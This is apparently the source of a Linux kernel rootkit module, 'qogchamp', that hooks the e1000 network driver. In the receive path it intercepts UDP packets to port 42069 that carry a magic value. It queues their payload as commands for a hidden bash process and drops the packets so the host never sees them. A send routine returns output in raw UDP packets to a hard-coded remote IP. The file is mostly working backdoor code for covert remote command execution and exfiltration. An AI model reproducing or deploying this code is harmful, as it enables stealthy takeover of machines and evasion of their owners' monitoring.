#include "e1000_hook.h"
#include "e1000_hw.h"
#include "e1000_osdep.h"
#include "networking.h"
#include "tty_util.h"



#undef ETH_HLEN
#define ETH_HLEN sizeof(struct ethhdr)
#define IP_HLEN sizeof(struct iphdr)
#define UDP_HLEN sizeof(struct udphdr)
#define TCP_HLEN sizeof(struct tcphdr)

#define UDP 17 //UDP Protocol number



/*Literally spells QOGCHAMP in little endian. Keep in mind that in little endian the least 
significant byte comes first. So, on the stack it will be 
PMAHCGOQ where Q is is at the lowest memory address*/
const unsigned long qogchamp_magic = 0x504d414843474f51;

const char* DEST = "\x8\x8\x8\x8"; //"\x81\x15\x5a\x95"; //ip address - big endian. The first octet is at index 0 in the string. 
//both of these extern structs are created in tty_util
extern struct list_head commands; 

extern struct wait_queue_head command_wait;

extern spinlock_t commands_lock;

extern struct net_device* e1000_netdev;

extern struct task_struct* bash_proc;

static struct net* bash_net_ns = NULL; //is a global variable even good design??

struct e1000_adapter* get_e1000_adapter(struct net_device* net_dev){
    return (struct e1000_adapter*) netdev_priv(net_dev);
}


/*

this code is pretty much copied word for word from:
https://elixir.bootlin.com/linux/v5.14/source/net/ipv4/ipconfig.c#L812

If anyone has documentation on how to actually construct an skb properly, please dm me.

I have been unable to find proper documentation on how this shit works.

*/


static __be32 get_saddr(void){
    if(!e1000_netdev){
        printk(KERN_INFO "e1000 is NULL\n");
        return 0;
    }
    /*
    This returns the PRIMARY unicast host address. In IP addressing, there are secondary and primary IP addresses. 
    Primary is used for outgoing traffic as the saddr and secondary is used for bind traffic.

    For more information on this phenomenon, please reference:
    https://elixir.bootlin.com/linux/v5.14/source/include/uapi/linux/if_addr.h#L44
    https://elixir.bootlin.com/linux/v5.14/source/net/ipv4/devinet.c#L1317

    */
    return inet_select_addr(e1000_netdev, 0, RT_SCOPE_HOST); 
}


static struct net* get_net_ns_bash(void){
    

    if(bash_net_ns){ 
        return bash_net_ns;
    }
    if(bash_proc){
        struct nsproxy* nsproxy;
        task_lock(bash_proc);
        nsproxy = bash_proc -> nsproxy;
        if(nsproxy){
            bash_net_ns = get_net(nsproxy -> net_ns);
        }

        task_unlock(bash_proc);
        return bash_net_ns;


    }else{
        printk(KERN_INFO "bash_proc is NULL\n");
        return NULL;
    }

}







int construct_and_send_skb(char* data, unsigned int len){ //this is called in process context. TODO: Add support for meta commands

    if(!e1000_netdev){
        printk(KERN_INFO "e1000 has not been initialized\n");
        return -1;
    }

    struct e1000_packet* packet;

    struct rtable* rt = NULL;

    struct flowi4 flow;

    __be32 saddr = get_saddr();

    struct neighbour* neigh; //an EU guy made this so we use neighboUr instead of neighbor like sane human beings

    bool is_v6gw = false;


    if(!bash_net_ns){ //if it doesn't exist, get it
        if(!get_net_ns_bash()){ //if it still doesn't exist, we can't route it lol
            printk(KERN_INFO "No network namespace, can't route\n");
            return -1;
        }
    } 


    


    
    int headroom = LL_RESERVED_SPACE(e1000_netdev);
    int tailroom = e1000_netdev -> needed_tailroom;
    struct sk_buff* skb = alloc_skb(sizeof(struct e1000_packet) + headroom + tailroom + len, GFP_KERNEL); //e1000_packet contains structures.
    skb_reserve(skb, headroom);
    /*
    Post skb_reserve
                              head -->  ___________________________
                                       |                          |
                                       |                          |
                                       | E1000_HEADROOM (64 bytes)|
                                       |                          |
                                       |                          |
                   data --> tail -->   |__________________________|
                                       |                          |
                                       |                          |
                                       |                          |
                                       |                          |
                                       |      Actual Data         |
                                       |                          |
                                       |                          |
                                end -->|__________________________|
                                       |                          |
                                       |                          |
                                       |  sizeof(skb_shared_info) |
                                       |                          |
                                       |                          |
                                       |__________________________|
                    
            
*/
    packet = skb_put_zero(skb, len+sizeof(struct e1000_packet));

    /*
    Post skb_put_zero
                              head -->  ___________________________
                                       |                          |
                                       |                          |
                                       | E1000_HEADROOM (64 bytes)|
                                       |                          |
                                       |                          |
                             data -->  |__________________________|
                                       |                          |
                                       |                          |
                                       |        Actual Data       |
                                       |                          |
                             tail ->   |                          |
                                       |__________________________|
                                       |     tailroom             |
                                end -->|__________________________|
                                       |                          |
                                       |                          |
                                       |  sizeof(skb_shared_info) |
                                       |                          |
                                       |                          |
                                       |__________________________|
                    
            
*/

    skb_reset_network_header(skb);
    
    

    
    packet -> iph.version = 4;
    packet -> iph.ihl=5;
    packet -> iph.tot_len = htons(sizeof(struct e1000_packet)+len);
    packet->iph.frag_off = htons(IP_DF);
    packet -> iph.ttl = 64;
    packet -> iph.protocol = IPPROTO_UDP;
    packet->iph.daddr = *(unsigned int*)DEST; //this will maintain the byte order of the string
    packet -> iph.saddr = saddr; //get the source addr

    packet -> iph.check = ip_fast_csum((unsigned char*)&packet->iph, packet->iph.ihl);

    //lets do UDP now.

    skb_set_transport_header(skb, offsetof(struct e1000_packet, udp)); //the first bytes at the data pointer are the e1000_header packets.

    packet -> udp.source = htons(42069);
    packet -> udp.dest = htons(10000);
    packet -> udp.len = htons(sizeof(struct e1000_packet)-sizeof(struct iphdr) + len); //UDP header length is sizeof(udphdr)+length of payload

    memcpy((unsigned char*)(packet + 1), data, len);
    
    skb -> dev = e1000_netdev;
    skb -> protocol = htons(ETH_P_IP);

    //lets do some routing. Most of this code is copied from: https://elixir.bootlin.com/linux/v5.14/source/net/ipv4/icmp.c#L480


    memset(&flow, 0, sizeof(flow));

    flow.saddr = saddr;
    flow.daddr = *(unsigned int*)DEST; //this will maintain the byte order of the string
    flow.flowi4_proto = IPPROTO_UDP;
    flow.flowi4_uid = sock_net_uid(bash_net_ns, NULL);
    flow.flowi4_oif = l3mdev_master_ifindex(e1000_netdev);

    //printk(KERN_INFO "flowi4_uid: %u flowi4_oif: %u\n", flow.flowi4_uid.val, flow.flowi4_oif);

    rt = ip_route_output_key_hash(bash_net_ns, &flow, skb);
    skb_dst_set(skb, (struct dst_entry*)rt); //idk if this actually does anything, but ill do it to be safe

    //the code below is copied from https://elixir.bootlin.com/linux/v5.14/source/net/ipv4/ip_output.c#L187
    rcu_read_lock_bh(); //ig this code is not rcu safe in bottom half context. 
    neigh = ip_neigh_for_gw(rt, skb, &is_v6gw);

    if(!IS_ERR(neigh)){
        int res;
        sock_confirm_neigh(skb, neigh);

        res = neigh_output(neigh, skb, is_v6gw); //actually send the damn thing
        //printk(KERN_INFO "result: %d\n", res);

        rcu_read_unlock_bh();
        return res;
        
    }

    rcu_read_unlock_bh();

    return -1;

    






    if(rt)
       kfree(rt);
    //kfree_skb(skb); //We don't need this because the skb is freed in the neigh_output path

    






    
   
    
        
    
    
    
    
    
}


//THE FUNCTIONS BELOW ARE ALL COPIED FROM THE E1000 DRIVER


#define COPYBREAK_DEFAULT 256
unsigned int copybreak __read_mostly = COPYBREAK_DEFAULT;



#define E1000_HEADROOM (NET_SKB_PAD + NET_IP_ALIGN)
unsigned int e1000_frag_len(const struct e1000_adapter *a)
{	
    //SKB_DATA_ALIGN will align the size to the next cacheline boundry which, in the case of x86 is 64 bytes.
    //This is easily calculated as (a->rx_buffer_len + E1000_HEADROOM) + 64 - ((a->rx_buffer_len + E1000_HEADROOM) % 64)
    return SKB_DATA_ALIGN(a->rx_buffer_len + E1000_HEADROOM) +
        SKB_DATA_ALIGN(sizeof(struct skb_shared_info)); 
        //this, in the case of standard rx frame size (1522 bytes) will result in 1920 bytes
        //with 1600 bytes reserved for headroom and the actual buffer and 320 bytes reserved for the skb_shared_info struct
}

void e1000_tbi_adjust_stats(struct e1000_hw *hw, struct e1000_hw_stats *stats, u32 frame_len, const u8 *mac_addr)
{
    u64 carry_bit;

    /* First adjust the frame length. */
    frame_len--;
    /* We need to adjust the statistics counters, since the hardware
     * counters overcount this packet as a CRC error and undercount
     * the packet as a good packet
     */
    /* This packet should not be counted as a CRC error. */
    stats->crcerrs--;
    /* This packet does count as a Good Packet Received. */
    stats->gprc++;

    /* Adjust the Good Octets received counters */
    carry_bit = 0x80000000 & stats->gorcl;
    stats->gorcl += frame_len;
    /* If the high bit of Gorcl (the low 32 bits of the Good Octets
     * Received Count) was one before the addition,
     * AND it is zero after, then we lost the carry out,
     * need to add one to Gorch (Good Octets Received Count High).
     * This could be simplified if all environments supported
     * 64-bit integers.
     */
    if (carry_bit && ((stats->gorcl & 0x80000000) == 0))
        stats->gorch++;
    /* Is this a broadcast or multicast?  Check broadcast first,
     * since the test for a multicast frame will test positive on
     * a broadcast frame.
     */
    if (is_broadcast_ether_addr(mac_addr))
        stats->bprc++;
    else if (is_multicast_ether_addr(mac_addr))
        stats->mprc++;

    if (frame_len == hw->max_frame_size) {
        /* In this case, the hardware has overcounted the number of
         * oversize frames.
         */
        if (stats->roc > 0)
            stats->roc--;
    }

    /* Adjust the bin counters when the extra byte put the frame in the
     * wrong bin. Remember that the frame_len was adjusted above.
     */
    if (frame_len == 64) {
        stats->prc64++;
        stats->prc127--;
    } else if (frame_len == 127) {
        stats->prc127++;
        stats->prc255--;
    } else if (frame_len == 255) {
        stats->prc255++;
        stats->prc511--;
    } else if (frame_len == 511) {
        stats->prc511++;
        stats->prc1023--;
    } else if (frame_len == 1023) {
        stats->prc1023++;
        stats->prc1522--;
    } else if (frame_len == 1522) {
        stats->prc1522++;
    }
}


bool e1000_tbi_should_accept(struct e1000_adapter *adapter, u8 status, u8 errors, u32 length, const u8 *data)
{
    struct e1000_hw *hw = &adapter->hw;
    u8 last_byte = *(data + length - 1);

    if (TBI_ACCEPT(hw, status, errors, length, last_byte)) {
        unsigned long irq_flags;

        spin_lock_irqsave(&adapter->stats_lock, irq_flags);
        e1000_tbi_adjust_stats(hw, &adapter->stats, length, data);
        spin_unlock_irqrestore(&adapter->stats_lock, irq_flags);

        return true;
    }

    return false;
}

void e1000_receive_skb(struct e1000_adapter *adapter, u8 status, __le16 vlan, struct sk_buff *skb)
{
    struct iphdr* ip;
    struct udphdr* udp;
    char* true_data;
    size_t true_data_len;
    unsigned long flags;
    //printk(KERN_INFO "skb length: %d", skb->len);
    struct ethhdr* eth = (struct ethhdr*)skb->data; //reference ethhdr with old data pointer before it gets incremented by eth_type_trans

    skb->protocol = eth_type_trans(skb, adapter->netdev); 

    ip = (struct iphdr*)skb->data; //ip header pointer. Ideally some kind of switch needs to be created here lul
    if(ip -> protocol != UDP) //let it through if its not UDP
        goto good;

    /*
    The cool thing is that these increments can NEVER segfault because skb is allocated to be as big as the MTU. BatChest

    All of this code is run by the BH handler. 
    */
    udp = (struct udphdr*)(skb->data + IP_HLEN); //udp header ptr
    true_data = (char*)(skb->data + IP_HLEN + UDP_HLEN); //true data
    if(*((unsigned long*)true_data) != qogchamp_magic){ //let it through if it doesn't have the magic 
        goto good;
    }
    true_data += 8;//add 8 bytes to go past the QOGCHAMP magic
    true_data_len = be16_to_cpu(udp->len)-8; //subtract out the qogchamp_magic
    if(be16_to_cpu(udp->dest) == 42069){ //TODO: make the interfaces' ip matches the dest IP.
       //welcome to Qogchamp   
        struct command* next_cmd = kzalloc(sizeof(struct command), GFP_ATOMIC); //WE CANNOT SLEEP IN A BOTTOM HALF
       // printk(KERN_INFO "Allocated next_cmd\n");
        if(!next_cmd){
            printk(KERN_INFO "Allocation failed\n");
            goto failed;
        }
        next_cmd -> str = kzalloc(true_data_len-UDP_HLEN+1, GFP_ATOMIC); //udp->len includes the udp header so subtract 8 bytes out and add 1 so it can be null terminated
       // printk(KERN_INFO "Allocated next_cmd -> str\n");
        if(!next_cmd -> str){
            printk(KERN_INFO "Allocation failed\n");
            goto failed;
        }

        next_cmd->str[true_data_len-UDP_HLEN] = '\n'; //end it with a new line. 
        next_cmd->size  = true_data_len - UDP_HLEN+1; //subtract off the size of a udp header as that is generally included in the size.  
        next_cmd -> list.prev = &next_cmd -> list; //this is the definition of an initialized list. Refernece LIST_HEAD_INIT in the source
        next_cmd -> list.next = &next_cmd -> list;

        strncpy(next_cmd->str, true_data, true_data_len-UDP_HLEN);
       // printk(KERN_INFO "strcpy done\n");
        spin_lock_irqsave(&commands_lock, flags);
        list_add_tail(&next_cmd->list, &commands);
        spin_unlock_irqrestore(&commands_lock, flags);


        if(wq_has_sleeper(&command_wait)){
            wake_up(&command_wait); //we sleep if we are starved of commands to execute. 
        }
failed:        //even if it fails we still want it to be hidden
        dev_kfree_skb(skb); //free the skb. Don't use slab cache space because that would be cringe. This will return immediately and not send it up the stack.
        return;
    }


    //eth_type_trans "pops" the ethernet header via skb_pull_inline. So, get it now or hold your peace ig
    //In reality what does this is add ETH_HLEN (Length of an ethernet header) to skb->data and decrements the size
    
    
    /**
    It is immensely important to note that eth_type_trans not only sets the protocol, but also sets up the skb->mac_header. So, we can use skb->data to access the mac header
    */
    
good:
    if (status & E1000_RXD_STAT_VP) {
        u16 vid = le16_to_cpu(vlan) & E1000_RXD_SPC_VLAN_MASK;

        __vlan_hwaccel_put_tag(skb, htons(ETH_P_8021Q), vid);
    }

    napi_gro_receive(&adapter->napi, skb);
}


void e1000_rx_checksum(struct e1000_adapter *adapter, u32 status_err, u32 csum, struct sk_buff *skb)
{
    struct e1000_hw *hw = &adapter->hw;
    u16 status = (u16)status_err;
    u8 errors = (u8)(status_err >> 24);

    skb_checksum_none_assert(skb);

    /* 82543 or newer only */
    if (unlikely(hw->mac_type < e1000_82543))
        return;
    /* Ignore Checksum bit is set */
    if (unlikely(status & E1000_RXD_STAT_IXSM))
        return;
    /* TCP/UDP checksum error bit is set */
    if (unlikely(errors & E1000_RXD_ERR_TCPE)) {
        /* let the stack verify checksum errors */
        adapter->hw_csum_err++;
        return;
    }
    /* TCP/UDP Checksum has not been calculated */
    if (!(status & E1000_RXD_STAT_TCPCS))
        return;

    /* It must be a TCP or UDP packet with a valid checksum */
    if (likely(status & E1000_RXD_STAT_TCPCS)) {
        /* TCP checksum is good */
        skb->ip_summed = CHECKSUM_UNNECESSARY;
    }
    adapter->hw_csum_good++;
}


struct sk_buff *e1000_alloc_rx_skb(struct e1000_adapter *adapter, unsigned int bufsz)
{
    struct sk_buff *skb = napi_alloc_skb(&adapter->napi, bufsz);

    if (unlikely(!skb))
        adapter->alloc_rx_buff_failed++;
    return skb;
}



struct sk_buff *e1000_copybreak(struct e1000_adapter *adapter, struct e1000_rx_buffer *buffer_info, u32 length, const void *data)
{
    struct sk_buff *skb;

    if (length > copybreak)
        return NULL;

    skb = e1000_alloc_rx_skb(adapter, length);
    if (!skb)
        return NULL;

    dma_sync_single_for_cpu(&adapter->pdev->dev, buffer_info->dma,
                length, DMA_FROM_DEVICE);

    skb_put_data(skb, data, length);

    return skb;
}



bool e1000_clean_rx_irq(struct e1000_adapter *adapter, struct e1000_rx_ring *rx_ring, int *work_done, int work_to_do)
{
    struct net_device *netdev = adapter->netdev;
    struct pci_dev *pdev = adapter->pdev;
    struct e1000_rx_desc *rx_desc, *next_rxd;
    struct e1000_rx_buffer *buffer_info, *next_buffer;
    u32 length;
    unsigned int i;
    int cleaned_count = 0;
    bool cleaned = false;
    unsigned int total_rx_bytes = 0, total_rx_packets = 0;
    
    i = rx_ring->next_to_clean;
    rx_desc = E1000_RX_DESC(*rx_ring, i); //the rx_desc contains information about a portion of the ring buffer. An rx_desc is typically directly accessed and modified by the device and contains data such as length and other useful information.
    buffer_info = &rx_ring->buffer_info[i]; //the buffer_info actually contains the data of that ring buffer among other metadata including DMA addresses. The e1000_rx_buffer can be thought of as the kernel-side perspective on the ring buffer

    while (rx_desc->status & E1000_RXD_STAT_DD) { //read all descriptor dones
        struct sk_buff *skb;
        u8 *data;
        u8 status;

        if (*work_done >= work_to_do)
            break;
        (*work_done)++;
        dma_rmb(); /* read descriptor and rx_buffer_info after status DD */
        
        


        status = rx_desc->status;
        length = le16_to_cpu(rx_desc->length);

        data = buffer_info->rxbuf.data;
        prefetch(data);
        
        
        skb = e1000_copybreak(adapter, buffer_info, length, data); //copybreak is a method that is used for small frames. 
        if (!skb) {
            
            unsigned int frag_len = e1000_frag_len(adapter); 
            //This returns the intended length of the skb. This is equivalent to the max length of a rx desc (1522) - look in qogchamp_main + E1000_HEADROOM + sizeof(skb_shared_info)
            //I don't know what the last two are for.
            //Looking into build_skb we see that the size is decremented by sizeof(skb_shared_info) 
            


            //printk("Didn't copybreak. Copybreak: %d, Length: %d, Frag Len: %d", copybreak, length, frag_len);	
            skb = build_skb(data - E1000_HEADROOM, frag_len); //remember we start by decrementing. This is valid because when allocating the associated buffer_info in e1000_alloc_frag, we add E1000_HEADROOM. So, subtracting E1000_HEADROOM takes us to the beginning
            //printk(KERN_INFO "frag len: %d\n", frag_len);
            //printk(KERN_INFO "Aligned size: %d, Unaligned size: %d\n", SKB_DATA_ALIGN(adapter->rx_buffer_len + E1000_HEADROOM), adapter->rx_buffer_len + E1000_HEADROOM);
            

            
            /*
            Upon building the SKB, we get the following state:
            This information can be found in build_skb -> __build_skb -> __build_skb_around

            NOTE: skb->tail is an offset (unsigned int) in this case. At the time of build_skb, skb->tail is 0.

            Remember, we start by decrementing data by E1000_HEADROOM which puts head, data, and tail E1000_HEADROOM
            bytes before the actual data of the packet. 

            head --> data --> tail --> ___________________________
                                       |                          |
                                       |                          |
                                       | E1000_HEADROOM (64 bytes)|
                                       |                          |
                                       |                          |
                                       |__________________________|
                                       |                          |
                                       |                          |
                                       |                          |
                                       |                          |
                                       |   Actual data            |
                                       |True length: rx_desc ->len|
                                       |Max length: 1600 bytes    |
                                       |                          |
                                end -->|__________________________|
                                       |                          |
                                       |                          |
                                       |  sizeof(skb_shared_info) |
                                       |                          |
                                       |                          |
                                       |__________________________|
                    
            
            */



            if (!skb) {
                adapter->alloc_rx_buff_failed++;
                break;
            }
            
            

            skb_reserve(skb, E1000_HEADROOM); 
            //reserve advances data and tail E1000_HEADROOM bytes.
            //The purpose of this is to allow some space between the data and the head
            

            /*
            State of the skb after the reserve. At this point data > head and data - head == tail == E1000_HEADROOM == 64
                At this point skb->len is 0

                             head -->  ___________________________
                                       |                          |
                                       |                          |
                                       | E1000_HEADROOM (64 bytes)|
                                       |                          |
                                       |                          |
                     data --> tail --> |__________________________|
                                       |                          |
                                       |                          |
                                       |                          |
                                       |                          |
                                       |    Actual data           |
                                       |True length: rx_desc ->len|
                                       |Max length: 1600 bytes    |
                                       |                          |
                                end -->|__________________________|
                                       |                          |
                                       |                          |
                                       |  sizeof(skb_shared_info) |
                                       |                          |
                                       |                          |
                                       |__________________________|
                    
            
            */

            //printk("data-head: %ld, tail: %d", (long)(skb->data-skb->head), skb->tail);
            //printk(KERN_INFO "end: %d", skb->end-skb->tail); //for some reason this is 1600. Idk where the extra 14 bytes came from. These 14 extra bytes came from aligning it to a cacheline (64 bytes) 
            

            dma_unmap_single(&pdev->dev, buffer_info->dma,
                     adapter->rx_buffer_len,
                     DMA_FROM_DEVICE);
            buffer_info->dma = 0;
            buffer_info->rxbuf.data = NULL;
        }

        //printk(KERN_INFO "head: %lu, data: %lu, tail: %d, end: %d\n", (unsigned long)skb->head, (unsigned long)skb->data, skb->tail, skb->end);
        /*int j = 0;
        printk(KERN_INFO "_______________________________");
        for(; j<E1000_HEADROOM; j++){
            printk(KERN_INFO "0x%x", *(char*)(skb->head+j) & 0xff);
        }*/
        if (++i == rx_ring->count)
            i = 0;

        next_rxd = E1000_RX_DESC(*rx_ring, i);
        prefetch(next_rxd);

        next_buffer = &rx_ring->buffer_info[i];

        cleaned = true;
        cleaned_count++;

        



        /* !EOP means multiple descriptors were used to store a single
         * packet, if thats the case we need to toss it.  In fact, we
         * to toss every packet with the EOP bit clear and the next
         * frame that _does_ have the EOP bit set, as it is by
         * definition only a frame fragment
         */
        if (unlikely(!(status & E1000_RXD_STAT_EOP)))
            adapter->discarding = true;

        if (adapter->discarding) {
            /* All receives must fit into a single buffer */
            netdev_dbg(netdev, "Receive packet consumed multiple buffers\n");
            dev_kfree_skb(skb);
            if (status & E1000_RXD_STAT_EOP)
                adapter->discarding = false;
            goto next_desc;
        }

        if (unlikely(rx_desc->errors & E1000_RXD_ERR_FRAME_ERR_MASK)) {
            if (e1000_tbi_should_accept(adapter, status,
                            rx_desc->errors,
                            length, data)) {
                length--;
            } else if (netdev->features & NETIF_F_RXALL) {
                goto process_skb;
            } else {
                dev_kfree_skb(skb);
                goto next_desc;
            }
        }

process_skb:
        //TODO: Don't keep a record in total_rx_bytes
        total_rx_bytes += (length - 4); /* don't count FCS */ 
        total_rx_packets++;

        if (likely(!(netdev->features & NETIF_F_RXFCS)))
            /* adjust length to remove Ethernet CRC, this must be
             * done after the TBI_ACCEPT workaround above
             */
            length -= 4;

        if (buffer_info->rxbuf.data == NULL) //not copybreak skb. Note the last line in the !skb block
            skb_put(skb, length); //skb_put advances the tail section by length (desc -> length)
        else /* copybreak skb */
            skb_trim(skb, length);

        //printk("Packet length: %ld, %d", skb->tail - (skb->data - skb->head), length);

        //printk(KERN_INFO "Aligned size: %ld\n", SKB_DATA_ALIGN(sizeof(struct skb_shared_info)));
        

        
        /*
        State after the skb_put:

        As is evident by this series of diagrams, the gap between head and data is for haedroom, the gap between data and tail is for
        packet ddata and the gap between tail and end is for the remaining, unused part of the MTU.
            At this point skb->len is equal to desc->length or tail - (data-head)
        
                             head -->  ___________________________
                                       |                          |
                                       |                          |
                                       | E1000_HEADROOM (64 bytes)|
                                       |	ALL 0 bytes           |
                                       |                          |
                             data -->  |__________________________|
                                       |                          |
                                       |    Packet data           |
                                       |   Size: desc->length     |
                                       |                          |
                             tail -->  |__________________________|
                                       |                          |
                                       |    Remaing,unused        |
                                       |    portion of MTU        |
                                       |    All 0 bytes           |
                                end -->|__________________________|
                                       |                          |
                                       |                          |
                                       |                          |
                                       |  sizeof(skb_shared_info) |
                                       |                          |
                                       |                          |
                                       |__________________________|
        

        More specifically, skb->len == (tail) - (data-head) == rx_desc -> length. Remember tail is an offset from head not data and data/head are pointers 
        
        */



        /* Receive Checksum Offload */
        e1000_rx_checksum(adapter,
                  (u32)(status) |
                  ((u32)(rx_desc->errors) << 24),
                  le16_to_cpu(rx_desc->csum), skb);

        e1000_receive_skb(adapter, status, rx_desc->special, skb); //send it up the network stack.

next_desc:
        rx_desc->status = 0;

        /* return some buffers to hardware, one at a time is too slow */
        if (unlikely(cleaned_count >= E1000_RX_BUFFER_WRITE)) {
            adapter->alloc_rx_buf(adapter, rx_ring, cleaned_count);
            cleaned_count = 0;
        }

        /* use prefetched values */
        rx_desc = next_rxd;
        buffer_info = next_buffer;
    }
    rx_ring->next_to_clean = i;

    cleaned_count = E1000_DESC_UNUSED(rx_ring);
    if (cleaned_count)
        adapter->alloc_rx_buf(adapter, rx_ring, cleaned_count);

    adapter->total_rx_packets += total_rx_packets;
    adapter->total_rx_bytes += total_rx_bytes;
    netdev->stats.rx_bytes += total_rx_bytes;
    netdev->stats.rx_packets += total_rx_packets;
    return cleaned;
}